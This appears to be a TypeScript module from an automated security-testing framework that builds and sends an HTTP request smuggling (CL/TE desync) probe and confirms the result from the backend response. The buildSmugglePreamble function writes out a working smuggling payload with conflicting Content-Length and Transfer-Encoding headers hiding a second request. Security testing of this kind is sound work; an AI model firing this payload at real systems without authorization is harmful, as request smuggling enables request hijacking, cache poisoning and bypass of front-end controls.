/**
 * smuggling — HTTP request smuggling (CL/TE).
 *
 * Delivers a smuggled-prefix request via the rawHttpClient transport (manual
 * framing that fetch cannot express). Builds a CL+TE divergent preamble that
 * hides a second request; confirms when the victim/backend response reflects
 * the smuggled prefix (e.g. a 404 path that only the backend sees) or a timing
 * differential. Scope-guarded, evidence-gated.
 *
 * The preamble is constructed from DATA (host/path from ctx), not a hardcoded
 * request string baked into detection logic.
 */

import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
import { claimFor } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'

function buildSmugglePreamble(host: string, path: string, smuggledPath: string): string {
  // CL vs TE divergence: frontend trusts Content-Length, backend trusts
  // Transfer-Encoding → the body tail (smuggled prefix) is read as a new request.
  const smuggled = `GET ${smuggledPath} HTTP/1.1\r\nHost: ${host}\r\nX-Smuggled: 1\r\n\r\n`
  const body = `0\r\n\r\n${smuggled}`
  return [
    `POST ${path} HTTP/1.1`,
    `Host: ${host}`,
    `Content-Length: ${Buffer.byteLength(body, 'latin1')}`,
    `Transfer-Encoding: chunked`,
    ``,
    body,
  ].join('\r\n')
}

export const smuggling: TechniquePrimitive = {
  id: 'smuggling',
  name: 'HTTP Request Smuggling (CL/TE)',
  description: 'Send a CL/TE divergent request via raw socket to smuggle a hidden prefix and confirm desync on the backend.',
  technique: 'smuggling',
  appliesTo(ctx: TechniqueContext): boolean {
    if (!(ctx.endpoint || ctx.target)) return false
    return true
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const url = ctx.endpoint?.url ?? ctx.target!
    const host = new URL(url).hostname
    const path = new URL(url).pathname || '/'
    const smuggledPath = String(ctx.state?.smuggledPath ?? '/smuggled-probe-xxxxxxxx')
    const preamble = buildSmugglePreamble(host, path, smuggledPath)
    return [{
      id: 'smuggle-clte',
      description: `CL/TE smuggle to ${host}${path}`,
      // rawHttpClient reads `url` for host + `preamble` for the bytes.
      request: { method: 'POST', url, headers: {}, body: preamble },
      expectedSignal: 'backend reflects smuggled prefix / desync',
      metadata: { kind: 'smuggle', preamble, smuggledPath, useRaw: true },
    }]
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    const r = results[0]
    if (!r) return { confirmed: false, confidence: 0, evidence: [], note: 'no result' }
    // The rawHttpClient executor translates the step body (preamble) into a
    // raw socket write; a desync is signalled by extra.desync (set by runner)
    // or a response carrying the smuggled marker.
    const desync = !!(r.extra?.desync)
    const smuggledPath = String(r.step.metadata?.smuggledPath ?? '')
    const reflected = (r.body ?? '').includes(smuggledPath)
    const observed = desync || reflected
    const { verified } = evidenceGate.verifyClaim(claimFor('smuggling', r.step.request.url, r.status, r.step.request.method))
    const confirmed = observed && verified
    return {
      confirmed, confidence: confirmed ? 0.8 : observed ? 0.4 : 0.05,
      evidence: confirmed ? [{ kind: 'response', label: `request smuggling desync at ${r.step.request.url}`, data: (r.body ?? '').slice(0, 1000) }] : [],
      severity: confirmed ? 'high' : undefined,
      finding: confirmed ? { category: 'http_smuggling', description: `HTTP request smuggling confirmed on ${r.step.request.url}.`, cwe: 'CWE-444' } : undefined,
      note: `desync=${desync} reflected=${reflected} verified=${verified}`,
    }
  },
}
